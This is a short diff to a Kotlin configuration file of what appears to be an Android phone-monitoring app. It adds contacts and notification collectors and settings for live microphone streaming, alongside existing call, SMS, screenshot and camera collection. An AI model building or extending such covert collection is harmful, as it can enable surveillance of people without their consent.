@@ -28,6 +28,8 @@ object Config {
     const val DEFAULT_SCREENSHOT_INTERVAL_SEC = 300L
     const val DEFAULT_CAMERA_INTERVAL_SEC = 600L
     const val DEFAULT_HEARTBEAT_INTERVAL_SEC = 120L
+    const val DEFAULT_CONTACTS_INTERVAL_SEC = 21600L
+    const val DEFAULT_NOTIFICATIONS_INTERVAL_SEC = 60L
 
     // ---- Windows used when reading the system databases -----------------
     const val USAGE_WINDOW_SEC = 300L
@@ -56,6 +58,13 @@ object Config {
     const val LIVE_JPEG_QUALITY = 45
     const val LIVE_SCREENSHOT_QUALITY = 82
 
+    // ---- Live audio ----------------------------------------------------
+    const val LIVE_AUDIO_SAMPLE_RATE = 16000
+    const val LIVE_AUDIO_CHANNEL_CONFIG = android.media.AudioFormat.CHANNEL_IN_MONO
+    const val LIVE_AUDIO_ENCODING = android.media.AudioFormat.ENCODING_PCM_16BIT
+    const val LIVE_AUDIO_BUFFER_MS = 40L
+    const val LIVE_AUDIO_SOURCE = android.media.MediaRecorder.AudioSource.VOICE_COMMUNICATION
+
     /**
      * A mobile uplink is the real limit of the live view: a 4G cell often
      * uploads less than 1 Mbit/s. When the socket still has this many bytes
@@ -83,6 +92,8 @@ object CollectorIds {
     const val APPS = "apps"
     const val CALLS = "calls"
     const val SMS = "sms"
+    const val CONTACTS = "contacts"
+    const val NOTIFICATIONS = "notifications"
     const val SCREENSHOT = "screenshot"
     const val CAMERA = "camera"
     const val HEARTBEAT = "heartbeat"
